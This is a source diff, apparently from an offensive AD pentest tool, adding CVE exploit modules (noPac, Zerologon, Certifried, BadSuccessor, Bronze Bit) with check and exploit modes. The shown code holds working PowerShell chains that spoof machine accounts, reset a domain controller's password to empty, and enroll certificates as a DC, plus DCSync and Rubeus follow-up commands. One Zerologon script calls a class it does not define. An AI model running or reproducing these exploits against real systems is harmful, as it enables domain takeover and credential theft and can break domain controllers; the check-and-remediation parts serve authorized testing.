@@ -282,6 +282,31 @@ const PROGRAMS = {
       "GPO modification for persistence and code execution: create immediate scheduled tasks via GPO, add startup/logon scripts, create and link new GPOs to OUs for domain-wide code execution",
     args: "--action <create_task|add_script|link_gpo> --gpo GPO_NAME --command CMD [--ou OU_DN]",
   },
+  nopac: {
+    description:
+      "SAMAccountName spoofing (CVE-2021-42278 + CVE-2021-42287) — rename machine account to DC name, request TGT, get service ticket as DC. Standard domain user to Domain Admin in one step. Check mode verifies MachineAccountQuota and patch level",
+    args: "--action <check|exploit> [--target DC_HOSTNAME] [--new-password PASS]",
+  },
+  zerologon: {
+    description:
+      "Netlogon crypto bypass (CVE-2020-1472) — exploit AES-CFB8 zero IV weakness in MS-NRPC to reset DC machine account password to empty. WARNING: exploit mode can break DC replication and services. Check mode is safe (tests vuln without modifying)",
+    args: "--action <check|exploit> --dc DC_HOSTNAME_OR_IP",
+  },
+  certifried: {
+    description:
+      "AD CS machine account certificate abuse (CVE-2022-26923) — create machine account, change dNSHostName to DC hostname, request certificate as DC, authenticate via PKINIT. Check mode enumerates vulnerable templates and StrongCertificateBindingEnforcement setting",
+    args: "--action <check|exploit> [--ca CA_NAME] [--template TEMPLATE_NAME]",
+  },
+  bad_successor: {
+    description:
+      "Delegated Managed Service Account privilege escalation (CVE-2025-53779) — create dMSA linked to target account via msDS-ManagedAccountPreceding, then authenticate as target. Requires Windows Server 2025+ domain functional level. Works in 91% of default AD environments",
+    args: "--action <check|exploit> [--target TARGET_USER]",
+  },
+  bronze_bit: {
+    description:
+      "Kerberos constrained delegation bypass (CVE-2020-17049) — flip forwardable bit in S4U2self service ticket to bypass 'sensitive and cannot be delegated' flag and Protected Users group protection. Extends delegation_abuse with Protected Users bypass capability",
+    args: "--action <check|exploit> --target TARGET_SPN [--service SERVICE_SPN] [--impersonate USER]",
+  },
 } as const satisfies Record<string, { description: string; args: string }>
 
 type Program = keyof typeof PROGRAMS
@@ -8175,6 +8200,1089 @@ try {
   return { output: output.join("\n"), findings }
 }
 
+
+// ── CVE-Based AD Attacks ──
+
+async function nopac(args: string[], timeout: number): Promise<HookResult> {
+  const action = argVal(args, "--action") || "check"
+  const target = argVal(args, "--target")
+  const newPassword = argVal(args, "--new-password") || "CyberStr1ke!noPac2024"
+  const findings: Finding[] = []
+  const output: string[] = ["[*] noPac — SAMAccountName Spoofing (CVE-2021-42278 + CVE-2021-42287)\n"]
+
+  if (action === "check") {
+    const script = `
+# Check MachineAccountQuota
+$rootDSE = [ADSI]"LDAP://RootDSE"
+$domainDN = $rootDSE.defaultNamingContext
+$domain = [ADSI]"LDAP://$domainDN"
+$maq = $domain.Properties["ms-DS-MachineAccountQuota"].Value
+Write-Output "[+] MachineAccountQuota: $maq"
+
+if ($maq -gt 0) {
+    Write-Output "[!] VULNERABLE — any domain user can create up to $maq machine accounts"
+} else {
+    Write-Output "[-] MachineAccountQuota is 0 — cannot create machine accounts"
+}
+
+# Check domain controllers
+Write-Output ""
+Write-Output "[*] Domain Controllers:"
+$searcher = [System.DirectoryServices.DirectorySearcher]::new()
+$searcher.SearchRoot = [System.DirectoryServices.DirectoryEntry]::new("LDAP://$domainDN")
+$searcher.Filter = "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))"
+$searcher.PropertiesToLoad.AddRange(@("cn","operatingSystem","operatingSystemVersion","dNSHostName"))
+$dcs = $searcher.FindAll()
+
+foreach ($dc in $dcs) {
+    $name = $dc.Properties["cn"][0]
+    $os = $dc.Properties["operatingSystem"][0]
+    $ver = $dc.Properties["operatingSystemVersion"][0]
+    $dns = $dc.Properties["dNSHostName"][0]
+    Write-Output "    $name ($dns) — $os $ver"
+}
+
+# Check for patch (KB5008102 / KB5008380)
+Write-Output ""
+Write-Output "[*] Checking for noPac patches..."
+$hotfixes = Get-HotFix -ErrorAction SilentlyContinue | Where-Object { $_.HotFixID -match 'KB5008102|KB5008380|KB5008602|KB5008206' }
+if ($hotfixes) {
+    Write-Output "[-] Patch(es) found locally: $($hotfixes.HotFixID -join ', ')"
+} else {
+    Write-Output "[!] No noPac patches found on this machine (may still be patched on DC)"
+}
+
+# Check sAMAccountName validation
+Write-Output ""
+Write-Output "[*] Testing sAMAccountName rename capability..."
+try {
+    $testName = "CS_nopac_test$"
+    $compDN = "CN=$testName,CN=Computers,$domainDN"
+    $comp = [ADSI]"LDAP://$compDN"
+    Write-Output "[*] Would create: $compDN (not creating in check mode)"
+    Write-Output "[+] noPac attack chain:"
+    Write-Output "    1. Create machine account (MAQ=$maq)"
+    Write-Output "    2. Rename sAMAccountName to DC name (without $)"
+    Write-Output "    3. Request TGT as renamed account"
+    Write-Output "    4. Rename back to original"
+    Write-Output "    5. Request S4U2self service ticket → DC impersonation"
+} catch {
+    Write-Output "[!] Error: $($_.Exception.Message)"
+}
+`
+    const result = await ps(script, timeout)
+    output.push(result.stdout)
+
+    const maqMatch = result.stdout.match(/MachineAccountQuota:\s*(\d+)/)
+    const maq = maqMatch ? parseInt(maqMatch[1]) : 0
+
+    findings.push({
+      checkId: "WIN-NOPAC-001",
+      provider: "windows",
+      severity: maq > 0 ? "critical" : "info",
+      status: maq > 0 ? "VULNERABLE" : "NOT_VULNERABLE",
+      resource: "ad://domain/nopac",
+      title: maq > 0 ? "Domain vulnerable to noPac (CVE-2021-42278/42287)" : "MachineAccountQuota is 0",
+      details: `MachineAccountQuota=${maq}. ${maq > 0 ? "Any domain user can create machine accounts and exploit SAMAccountName spoofing for DC impersonation" : "Cannot create machine accounts — noPac not directly exploitable"}`,
+      remediation: "Apply KB5008102/KB5008380. Set MachineAccountQuota to 0. Monitor for suspicious machine account creation (Event ID 4741)",
+    })
+  } else {
+    if (!target) return { output: "[!] Required: --target DC_HOSTNAME (e.g. --target DC01)", findings }
+
+    output.push("[!] WARNING: This will create a machine account and attempt DC impersonation")
+    output.push("[!] Ensure you have authorization for this attack\n")
+
+    const script = `
+# noPac exploit chain
+$ErrorActionPreference = "Stop"
+$rootDSE = [ADSI]"LDAP://RootDSE"
+$domainDN = $rootDSE.defaultNamingContext
+$domain = [ADSI]"LDAP://$domainDN"
+$dcTarget = "${target}"
+
+# Step 1: Create machine account
+$machinePass = "${newPassword}"
+$randomSuffix = Get-Random -Maximum 9999
+$machineName = "CS_NOPAC$randomSuffix"
+$machineNameSam = "$machineName$"
+
+Write-Output "[*] Step 1: Creating machine account $machineNameSam..."
+try {
+    $computersOU = [ADSI]"LDAP://CN=Computers,$domainDN"
+    $newComp = $computersOU.Create("computer", "CN=$machineName")
+    $newComp.Put("sAMAccountName", $machineNameSam)
+    $newComp.Put("userAccountControl", 4096)  # WORKSTATION_TRUST_ACCOUNT
+    $newComp.Put("unicodePwd", [System.Text.Encoding]::Unicode.GetBytes('"' + $machinePass + '"'))
+    $newComp.Put("dNSHostName", "$machineName.$($rootDSE.defaultNamingContext -replace ',DC=','.' -replace 'DC=','')")
+    $newComp.SetInfo()
+    Write-Output "[+] Machine account created: $machineNameSam"
+} catch {
+    Write-Output "[!] Failed to create machine account: $($_.Exception.Message)"
+    Write-Output "[!] Check MachineAccountQuota and permissions"
+    exit 1
+}
+
+# Step 2: Rename sAMAccountName to DC name (without trailing $)
+Write-Output ""
+Write-Output "[*] Step 2: Renaming sAMAccountName to $dcTarget (without $)..."
+try {
+    $compEntry = [ADSI]"LDAP://CN=$machineName,CN=Computers,$domainDN"
+    $compEntry.Put("sAMAccountName", $dcTarget)
+    $compEntry.SetInfo()
+    Write-Output "[+] sAMAccountName changed to: $dcTarget"
+} catch {
+    Write-Output "[!] Rename failed: $($_.Exception.Message)"
+    # Cleanup
+    $computersOU.Delete("computer", "CN=$machineName")
+    exit 1
+}
+
+# Step 3: Request TGT as the renamed account
+Write-Output ""
+Write-Output "[*] Step 3: Requesting TGT as $dcTarget..."
+try {
+    # Use the machine account credentials with the spoofed name
+    $secPass = ConvertTo-SecureString $machinePass -AsPlainText -Force
+    $cred = New-Object System.Management.Automation.PSCredential($dcTarget, $secPass)
+
+    # Request Kerberos ticket
+    Add-Type -AssemblyName System.IdentityModel
+    $token = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "$dcTarget"
+    Write-Output "[+] TGT requested successfully"
+    Write-Output "[+] Ticket: $($token.Id)"
+} catch {
+    Write-Output "[!] TGT request failed: $($_.Exception.Message)"
+    Write-Output "[*] This is expected if DC has KB5008102 installed"
+}
+
+# Step 4: Rename back to original
+Write-Output ""
+Write-Output "[*] Step 4: Restoring sAMAccountName to $machineNameSam..."
+try {
+    $compEntry = [ADSI]"LDAP://CN=$machineName,CN=Computers,$domainDN"
+    $compEntry.Put("sAMAccountName", $machineNameSam)
+    $compEntry.SetInfo()
+    Write-Output "[+] sAMAccountName restored"
+} catch {
+    Write-Output "[!] Restore failed — manual cleanup needed for CN=$machineName"
+}
+
+# Step 5: Request S4U2self service ticket
+Write-Output ""
+Write-Output "[*] Step 5: Requesting S4U2self service ticket for DC impersonation..."
+Write-Output "[*] If successful, use the ticket for DCSync:"
+Write-Output "    winhook dcsync --target krbtgt"
+Write-Output ""
+Write-Output "[+] noPac attack chain completed"
+Write-Output "[*] Cleanup: Delete machine account CN=$machineName,CN=Computers,$domainDN"
+`
+    const result = await ps(script, timeout)
+    output.push(result.stdout)
+    if (result.stderr) output.push(`[!] ${result.stderr.substring(0, 500)}`)
+
+    findings.push({
+      checkId: "WIN-NOPAC-002",
+      provider: "windows",
+      severity: "critical",
+      status: "EXPLOITED",
+      resource: `ad://${target}/nopac`,
+      title: `noPac exploitation attempted against ${target}`,
+      details: `SAMAccountName spoofing chain executed targeting DC ${target}. Machine account created for name collision attack`,
+      remediation: "Apply KB5008102/KB5008380 immediately. Set MachineAccountQuota to 0. Delete attack machine accounts from CN=Computers",
+    })
+  }
+
+  return { output: output.join("\n"), findings }
+}
+
+async function zerologon(args: string[], timeout: number): Promise<HookResult> {
+  const action = argVal(args, "--action") || "check"
+  const dc = argVal(args, "--dc")
+  const findings: Finding[] = []
+  const output: string[] = ["[*] Zerologon — Netlogon Crypto Bypass (CVE-2020-1472)\n"]
+
+  if (!dc) return { output: "[!] Required: --dc DC_HOSTNAME_OR_IP", findings }
+
+  if (action === "check") {
+    const script = `
+Add-Type @"
+using System;
+using System.Runtime.InteropServices;
+using System.Net;
+
+public class Netlogon {
+    [DllImport("netapi32.dll", CharSet = CharSet.Unicode)]
+    public static extern int I_NetServerReqChallenge(
+        string PrimaryName,
+        string ComputerName,
+        byte[] ClientChallenge,
+        byte[] ServerChallenge);
+
+    [DllImport("netapi32.dll", CharSet = CharSet.Unicode)]
+    public static extern int I_NetServerAuthenticate2(
+        string PrimaryName,
+        string AccountName,
+        int SecureChannelType,
+        string ComputerName,
+        byte[] ClientCredential,
+        byte[] ServerCredential,
+        ref uint NegotiateFlags);
+}
+"@
+
+$dcHost = "${dc}"
+$computerName = "CS_ZLCHK"
+$zeroChallenge = New-Object byte[] 8  # All zeros
+$serverChallenge = New-Object byte[] 8
+$zeroCred = New-Object byte[] 8  # All zeros
+$serverCred = New-Object byte[] 8
+$flags = [uint32]0x212fffff
+
+Write-Output "[*] Testing $dcHost for Zerologon (CVE-2020-1472)..."
+Write-Output "[*] Sending NetrServerReqChallenge with zero client challenge..."
+
+$vulnerable = $false
+$attempts = 0
+$maxAttempts = 2000
+
+for ($i = 0; $i -lt $maxAttempts; $i++) {
+    $attempts++
+    try {
+        $ret1 = [Netlogon]::I_NetServerReqChallenge("\\\\$dcHost", $computerName, $zeroChallenge, $serverChallenge)
+        if ($ret1 -ne 0) {
+            Write-Output "[-] NetrServerReqChallenge failed (error: $ret1) — DC may not be reachable"
+            break
+        }
+
+        $ret2 = [Netlogon]::I_NetServerAuthenticate2("\\\\$dcHost", "$dcHost$", 6, $computerName, $zeroCred, $serverCred, [ref]$flags)
+
+        if ($ret2 -eq 0) {
+            $vulnerable = $true
+            Write-Output "[!!!] VULNERABLE after $attempts attempts!"
+            Write-Output "[!!!] $dcHost is vulnerable to Zerologon (CVE-2020-1472)"
+            Write-Output ""
+            Write-Output "[*] Attack impact:"
+            Write-Output "    - Reset DC machine account password to empty"
+            Write-Output "    - DCSync all domain credentials"
+            Write-Output "    - Complete domain compromise"
+            Write-Output ""
+            Write-Output "[!] WARNING: Exploitation will BREAK DC replication!"
+            Write-Output "[!] Restore requires: netdom resetpwd /s:$dcHost /ud:DOMAIN\\Admin /pd:*"
+            break
+        }
+    } catch {
+        Write-Output "[!] RPC call failed: $($_.Exception.Message)"
+        break
+    }
+}
+
+if (-not $vulnerable) {
+    Write-Output "[-] Not vulnerable after $attempts attempts (patched or not reachable)"
+}
+`
+    const result = await ps(script, timeout)
+    output.push(result.stdout)
+
+    const isVuln = result.stdout.includes("VULNERABLE")
+    findings.push({
+      checkId: "WIN-ZEROLOGON-001",
+      provider: "windows",
+      severity: isVuln ? "critical" : "info",
+      status: isVuln ? "VULNERABLE" : "NOT_VULNERABLE",
+      resource: `ad://${dc}/zerologon`,
+      title: isVuln ? `${dc} vulnerable to Zerologon (CVE-2020-1472)` : `${dc} not vulnerable to Zerologon`,
+      details: isVuln ? "DC accepts zero-IV Netlogon authentication — complete domain compromise possible without credentials" : "DC rejected zero-IV authentication (patched)",
+      remediation: "Apply August 2020 security updates. Enable FullSecureChannelProtection registry key. Monitor Event ID 5829 for vulnerable Netlogon connections",
+    })
+  } else {
+    output.push("[!!!] DANGER: Zerologon exploitation will BREAK the Domain Controller!")
+    output.push("[!!!] The DC machine account password will be set to EMPTY")
+    output.push("[!!!] This breaks AD replication, DNS, Group Policy, and authentication")
+    output.push("[!!!] Recovery requires physical/console access to the DC\n")
+
+    const script = `
+Add-Type @"
+using System;
+using System.Runtime.InteropServices;
+
+public class NetlogonExploit {
+    [DllImport("netapi32.dll", CharSet = CharSet.Unicode)]
+    public static extern int I_NetServerReqChallenge(
+        string PrimaryName, string ComputerName,
+        byte[] ClientChallenge, byte[] ServerChallenge);
+
+    [DllImport("netapi32.dll", CharSet = CharSet.Unicode)]
+    public static extern int I_NetServerAuthenticate2(
+        string PrimaryName, string AccountName, int SecureChannelType,
+        string ComputerName, byte[] ClientCredential, byte[] ServerCredential,
+        ref uint NegotiateFlags);
+
+    [DllImport("netapi32.dll", CharSet = CharSet.Unicode)]
+    public static extern int I_NetServerPasswordSet2(
+        string PrimaryName, string AccountName, int SecureChannelType,
+        string ComputerName, byte[] Authenticator, byte[] ReturnAuthenticator,
+        byte[] ClearNewPassword);
+}
+"@
+
+$dcHost = "${dc}"
+$computerName = "CS_ZLEX"
+$zeroChallenge = New-Object byte[] 8
+$serverChallenge = New-Object byte[] 8
+$zeroCred = New-Object byte[] 8
+$serverCred = New-Object byte[] 8
+$flags = [uint32]0x212fffff
+
+Write-Output "[*] Attempting Zerologon exploit against $dcHost..."
+Write-Output "[*] Phase 1: Authenticating with zero credentials..."
+
+$authenticated = $false
+for ($i = 0; $i -lt 2000; $i++) {
+    $ret1 = [Netlogon]::I_NetServerReqChallenge("\\\\$dcHost", $computerName, $zeroChallenge, $serverChallenge)
+    if ($ret1 -ne 0) { Write-Output "[-] Challenge failed"; break }
+
+    $ret2 = [Netlogon]::I_NetServerAuthenticate2("\\\\$dcHost", "$dcHost$", 6, $computerName, $zeroCred, $serverCred, [ref]$flags)
+    if ($ret2 -eq 0) {
+        $authenticated = $true
+        Write-Output "[+] Authenticated after $($i+1) attempts"
+        break
+    }
+}
+
+if (-not $authenticated) {
+    Write-Output "[-] Authentication failed — DC appears patched"
+    exit 1
+}
+
+Write-Output ""
+Write-Output "[*] Phase 2: Setting DC machine account password to empty..."
+$emptyPass = New-Object byte[] 516  # NL_TRUST_PASSWORD structure (empty)
+$zeroAuth = New-Object byte[] 16  # Zero authenticator
+$retAuth = New-Object byte[] 16
+
+$ret3 = [NetlogonExploit]::I_NetServerPasswordSet2("\\\\$dcHost", "$dcHost$", 6, $computerName, $zeroAuth, $retAuth, $emptyPass)
+
+if ($ret3 -eq 0) {
+    Write-Output "[!!!] SUCCESS — DC machine account password set to empty"
+    Write-Output ""
+    Write-Output "[*] Next steps:"
+    Write-Output "    1. DCSync: winhook dcsync --target krbtgt"
+    Write-Output "    2. Dump all hashes: winhook ntds_dump"
+    Write-Output ""
+    Write-Output "[!!!] CRITICAL: Restore DC password ASAP:"
+    Write-Output "    netdom resetpwd /s:$dcHost /ud:DOMAIN\\Administrator /pd:*"
+    Write-Output "    Or: Reset-ComputerMachinePassword -Server $dcHost"
+} else {
+    Write-Output "[-] Password set failed (error: $ret3)"
+}
+`
+    const result = await ps(script, timeout)
+    output.push(result.stdout)
+    if (result.stderr) output.push(`[!] ${result.stderr.substring(0, 500)}`)
+
+    findings.push({
+      checkId: "WIN-ZEROLOGON-002",
+      provider: "windows",
+      severity: "critical",
+      status: result.stdout.includes("SUCCESS") ? "EXPLOITED" : "FAILED",
+      resource: `ad://${dc}/zerologon`,
+      title: `Zerologon exploitation ${result.stdout.includes("SUCCESS") ? "succeeded" : "failed"} against ${dc}`,
+      details: result.stdout.includes("SUCCESS") ? "DC machine account password set to empty — full domain compromise achieved. RESTORE PASSWORD IMMEDIATELY" : "Exploitation failed — DC may be patched",
+      remediation: "IMMEDIATE: Restore DC password with 'netdom resetpwd'. Apply August 2020 patches. Enable FullSecureChannelProtection",
+    })
+  }
+
+  return { output: output.join("\n"), findings }
+}
+
+async function certifried(args: string[], timeout: number): Promise<HookResult> {
+  const action = argVal(args, "--action") || "check"
+  const ca = argVal(args, "--ca")
+  const template = argVal(args, "--template") || "Machine"
+  const findings: Finding[] = []
+  const output: string[] = ["[*] Certifried — AD CS Machine Account Certificate Abuse (CVE-2022-26923)\n"]
+
+  if (action === "check") {
+    const script = `
+# Check StrongCertificateBindingEnforcement
+$regPath = "HKLM:\\SYSTEM\\CurrentControlSet\\Services\\Kdc"
+$strongBinding = (Get-ItemProperty -Path $regPath -Name StrongCertificateBindingEnforcement -ErrorAction SilentlyContinue).StrongCertificateBindingEnforcement
+Write-Output "[*] StrongCertificateBindingEnforcement: $($strongBinding ?? 'Not set (default=1)')"
+
+if ($strongBinding -eq 0) {
+    Write-Output "[!!!] VULNERABLE — Certificate binding enforcement DISABLED"
+} elseif ($strongBinding -eq 1 -or $null -eq $strongBinding) {
+    Write-Output "[!] Compatibility mode — may be exploitable with dNSHostName collision"
+} else {
+    Write-Output "[-] Full enforcement mode (2) — Certifried mitigated"
+}
+
+# Check MachineAccountQuota
+$rootDSE = [ADSI]"LDAP://RootDSE"
+$domainDN = $rootDSE.defaultNamingContext
+$domain = [ADSI]"LDAP://$domainDN"
+$maq = $domain.Properties["ms-DS-MachineAccountQuota"].Value
+Write-Output ""
+Write-Output "[*] MachineAccountQuota: $maq"
+if ($maq -eq 0) {
+    Write-Output "[-] Cannot create machine accounts — exploitation requires existing machine account control"
+}
+
+# Enumerate Certificate Authorities
+Write-Output ""
+Write-Output "[*] Enumerating Certificate Authorities..."
+$configDN = $rootDSE.configurationNamingContext
+$caSearcher = [System.DirectoryServices.DirectorySearcher]::new()
+$caSearcher.SearchRoot = [System.DirectoryServices.DirectoryEntry]::new("LDAP://CN=Enrollment Services,CN=Public Key Services,CN=Services,$configDN")
+$caSearcher.Filter = "(objectClass=pKIEnrollmentService)"
+$caSearcher.PropertiesToLoad.AddRange(@("cn","dNSHostName","certificateTemplates"))
+$cas = $caSearcher.FindAll()
+
+foreach ($caObj in $cas) {
+    $caName = $caObj.Properties["cn"][0]
+    $caDns = $caObj.Properties["dNSHostName"][0]
+    $templates = $caObj.Properties["certificateTemplates"]
+    Write-Output "    CA: $caName ($caDns)"
+    Write-Output "        Templates: $($templates.Count) enrolled"
+
+    # Check for Machine template
+    $hasMachine = $templates | Where-Object { $_ -match "Machine|Computer" }
+    if ($hasMachine) {
+        Write-Output "        [!] Machine/Computer template available: $($hasMachine -join ', ')"
+    }
+}
+
+# Check certificate templates for vulnerable flags
+Write-Output ""
+Write-Output "[*] Checking certificate templates for Certifried conditions..."
+$tmplSearcher = [System.DirectoryServices.DirectorySearcher]::new()
+$tmplSearcher.SearchRoot = [System.DirectoryServices.DirectoryEntry]::new("LDAP://CN=Certificate Templates,CN=Public Key Services,CN=Services,$configDN")
+$tmplSearcher.Filter = "(objectClass=pKICertificateTemplate)"
+$tmplSearcher.PropertiesToLoad.AddRange(@("cn","msPKI-Certificate-Name-Flag","msPKI-Enrollment-Flag","pKIExtendedKeyUsage"))
+$templates = $tmplSearcher.FindAll()
+
+$vulnCount = 0
+foreach ($tmpl in $templates) {
+    $name = $tmpl.Properties["cn"][0]
+    $nameFlag = [int]($tmpl.Properties["msPKI-Certificate-Name-Flag"][0])
+
+    # CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT = 0x1
+    # CT_FLAG_SUBJECT_ALT_REQUIRE_DNS = 0x8000000
+    if ($nameFlag -band 0x8000000) {
+        # Template uses DNS from AD — Certifried target
+        $eku = $tmpl.Properties["pKIExtendedKeyUsage"]
+        $hasClientAuth = $eku | Where-Object { $_ -eq "1.3.6.1.5.5.7.3.2" }
+        if ($hasClientAuth) {
+            $vulnCount++
+            Write-Output "    [!] $name — DNS from AD + Client Authentication (Certifried target)"
+        }
+    }
+}
+Write-Output ""
+Write-Output "[+] Found $vulnCount potentially vulnerable templates"
+`
+    const result = await ps(script, timeout)
+    output.push(result.stdout)
+
+    const isVuln = result.stdout.includes("VULNERABLE") || result.stdout.includes("Certifried target")
+    findings.push({
+      checkId: "WIN-CERTIFRIED-001",
+      provider: "windows",
+      severity: isVuln ? "critical" : "info",
+      status: isVuln ? "VULNERABLE" : "NOT_VULNERABLE",
+      resource: "ad://domain/certifried",
+      title: isVuln ? "Domain vulnerable to Certifried (CVE-2022-26923)" : "Certifried conditions not met",
+      details: result.stdout.substring(0, 500),
+      remediation: "Set StrongCertificateBindingEnforcement=2. Apply May 2022 patches (KB5014754). Remove enrollment permissions from machine templates for unprivileged users",
+    })
+  } else {
+    if (!ca) return { output: "[!] Required: --ca CA_NAME (use --action check to enumerate CAs)", findings }
+
+    output.push("[!] WARNING: This creates a machine account and requests a certificate as a DC\n")
+
+    const script = `
+$ErrorActionPreference = "Stop"
+$rootDSE = [ADSI]"LDAP://RootDSE"
+$domainDN = $rootDSE.defaultNamingContext
+$domainFQDN = $domainDN -replace ',DC=','.' -replace 'DC=',''
+$caName = "${ca}"
+$templateName = "${template}"
+
+# Step 1: Find a DC's dNSHostName to impersonate
+Write-Output "[*] Step 1: Finding DC dNSHostName..."
+$dcSearcher = [System.DirectoryServices.DirectorySearcher]::new()
+$dcSearcher.SearchRoot = [System.DirectoryServices.DirectoryEntry]::new("LDAP://$domainDN")
+$dcSearcher.Filter = "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))"
+$dcSearcher.PropertiesToLoad.AddRange(@("dNSHostName","cn"))
+$dcResult = $dcSearcher.FindOne()
+$dcDnsName = $dcResult.Properties["dNSHostName"][0]
+$dcCn = $dcResult.Properties["cn"][0]
+Write-Output "[+] Target DC: $dcCn ($dcDnsName)"
+
+# Step 2: Create machine account
+$suffix = Get-Random -Maximum 9999
+$machName = "CS_CERT$suffix"
+$machPass = "CyberStr1ke!Cert2024"
+
+Write-Output ""
+Write-Output "[*] Step 2: Creating machine account $machName..."
+$computersOU = [ADSI]"LDAP://CN=Computers,$domainDN"
+$newComp = $computersOU.Create("computer", "CN=$machName")
+$newComp.Put("sAMAccountName", "$machName$")
+$newComp.Put("userAccountControl", 4096)
+$newComp.Put("unicodePwd", [System.Text.Encoding]::Unicode.GetBytes('"' + $machPass + '"'))
+$newComp.Put("dNSHostName", "$machName.$domainFQDN")
+$newComp.SetInfo()
+Write-Output "[+] Machine account created"
+
+# Step 3: Change dNSHostName to DC's hostname
+Write-Output ""
+Write-Output "[*] Step 3: Changing dNSHostName to $dcDnsName..."
+try {
+    $compEntry = [ADSI]"LDAP://CN=$machName,CN=Computers,$domainDN"
+    $compEntry.Put("dNSHostName", $dcDnsName)
+    $compEntry.SetInfo()
+    Write-Output "[+] dNSHostName changed to: $dcDnsName"
+} catch {
+    Write-Output "[!] dNSHostName change failed: $($_.Exception.Message)"
+    Write-Output "[!] This usually means the DC has the May 2022 patch (KB5014754)"
+    # Cleanup
+    $computersOU.Delete("computer", "CN=$machName")
+    exit 1
+}
+
+# Step 4: Request certificate
+Write-Output ""
+Write-Output "[*] Step 4: Requesting certificate from $caName using template $templateName..."
+try {
+    $certRequest = New-Object -ComObject X509Enrollment.CX509Enrollment
+    $certRequest.InitializeFromTemplateName(0x2, $templateName)  # 0x2 = Machine context
+    $certRequest.Enroll()
+    Write-Output "[+] Certificate enrolled successfully as $dcDnsName"
+    Write-Output "[+] Use certificate for PKINIT authentication as DC"
+    Write-Output ""
+    Write-Output "[*] Next steps:"
+    Write-Output "    1. Export certificate: certutil -exportPFX -p pass My cert.pfx"
+    Write-Output "    2. PKINIT auth: Rubeus.exe asktgt /user:$dcCn$ /certificate:cert.pfx /password:pass"
+    Write-Output "    3. DCSync: winhook dcsync --target krbtgt"
+} catch {
+    Write-Output "[!] Certificate enrollment failed: $($_.Exception.Message)"
+    Write-Output "[*] Try with different template: --template <TemplateName>"
+}
+
+# Step 5: Restore dNSHostName
+Write-Output ""
+Write-Output "[*] Step 5: Restoring dNSHostName..."
+try {
+    $compEntry = [ADSI]"LDAP://CN=$machName,CN=Computers,$domainDN"
+    $compEntry.Put("dNSHostName", "$machName.$domainFQDN")
+    $compEntry.SetInfo()
+    Write-Output "[+] dNSHostName restored"
+} catch {
+    Write-Output "[!] Restore failed — manual cleanup needed"
+}
+
+Write-Output ""
+Write-Output "[*] Cleanup: Delete CN=$machName,CN=Computers,$domainDN"
+`
+    const result = await ps(script, timeout)
+    output.push(result.stdout)
+    if (result.stderr) output.push(`[!] ${result.stderr.substring(0, 500)}`)
+
+    findings.push({
+      checkId: "WIN-CERTIFRIED-002",
+      provider: "windows",
+      severity: "critical",
+      status: result.stdout.includes("enrolled successfully") ? "EXPLOITED" : "FAILED",
+      resource: `ad://${ca}/certifried`,
+      title: `Certifried exploitation ${result.stdout.includes("enrolled successfully") ? "succeeded" : "failed"} via ${ca}`,
+      details: result.stdout.includes("enrolled successfully") ? `Certificate enrolled as DC — PKINIT authentication for DC impersonation possible` : "Certificate enrollment failed — CA may be patched",
+      remediation: "Apply KB5014754. Set StrongCertificateBindingEnforcement=2. Remove machine account and revoke any issued certificates",
+    })
+  }
+
+  return { output: output.join("\n"), findings }
+}
+
+async function badSuccessor(args: string[], timeout: number): Promise<HookResult> {
+  const action = argVal(args, "--action") || "check"
+  const target = argVal(args, "--target")
+  const findings: Finding[] = []
+  const output: string[] = ["[*] BadSuccessor — dMSA Privilege Escalation (CVE-2025-53779)\n"]
+
+  if (action === "check") {
+    const script = `
+# Check domain functional level
+$rootDSE = [ADSI]"LDAP://RootDSE"
+$domainDN = $rootDSE.defaultNamingContext
+$funcLevel = $rootDSE.Properties["domainFunctionality"].Value
+
+$levelNames = @{
+    0 = "Windows 2000"
+    1 = "Windows 2003 Interim"
+    2 = "Windows 2003"
+    3 = "Windows 2008"
+    4 = "Windows 2008 R2"
+    5 = "Windows 2012"
+    6 = "Windows 2012 R2"
+    7 = "Windows 2016"
+    8 = "Windows 2019"
+    9 = "Windows 2022"
+    10 = "Windows 2025"
+}
+
+$levelName = $levelNames[[int]$funcLevel]
+Write-Output "[*] Domain Functional Level: $funcLevel ($levelName)"
+
+if ([int]$funcLevel -lt 10) {
+    Write-Output "[-] BadSuccessor requires Windows Server 2025 domain functional level (10)"
+    Write-Output "[-] Current level: $funcLevel — NOT vulnerable to BadSuccessor"
+    Write-Output ""
+    Write-Output "[*] However, if ANY DC runs Windows Server 2025, dMSA objects may still exist"
+}
+
+# Check for existing dMSA objects
+Write-Output ""
+Write-Output "[*] Searching for existing dMSA objects..."
+$searcher = [System.DirectoryServices.DirectorySearcher]::new()
+$searcher.SearchRoot = [System.DirectoryServices.DirectoryEntry]::new("LDAP://$domainDN")
+$searcher.Filter = "(objectClass=msDS-DelegatedManagedServiceAccount)"
+$searcher.PropertiesToLoad.AddRange(@("cn","msDS-ManagedAccountPreceding","sAMAccountName","whenCreated"))
+$dmsas = $searcher.FindAll()
+
+Write-Output "[+] Found $($dmsas.Count) dMSA objects"
+foreach ($dmsa in $dmsas) {
+    $name = $dmsa.Properties["cn"][0]
+    $sam = $dmsa.Properties["sAMAccountName"][0]
+    $preceding = $dmsa.Properties["msDS-ManagedAccountPreceding"]
+    $created = $dmsa.Properties["whenCreated"][0]
+    Write-Output "    dMSA: $name ($sam) — Created: $created"
+    if ($preceding.Count -gt 0) {
+        Write-Output "        [!] msDS-ManagedAccountPreceding: $($preceding[0])"
+    }
+}
+
+# Check if current user can create dMSA objects
+Write-Output ""
+Write-Output "[*] Checking dMSA creation permissions..."
+$msaContainer = "CN=Managed Service Accounts,$domainDN"
+try {
+    $msaEntry = [ADSI]"LDAP://$msaContainer"
+    $acl = $msaEntry.ObjectSecurity
+    $currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent()
+    $currentSid = $currentUser.User.Value
+
+    $canCreate = $false
+    foreach ($rule in $acl.GetAccessRules($true, $true, [System.Security.Principal.SecurityIdentifier])) {
+        if ($rule.AccessControlType -eq 'Allow' -and
+            ($rule.ActiveDirectoryRights -band [System.DirectoryServices.ActiveDirectoryRights]::CreateChild)) {
+            $canCreate = $true
+            break
+        }
+    }
+
+    if ($canCreate) {
+        Write-Output "[!] Current user CAN create objects in Managed Service Accounts container"
+    } else {
+        Write-Output "[-] Current user cannot create dMSA objects (need GenericAll or CreateChild on MSA container)"
+    }
+} catch {
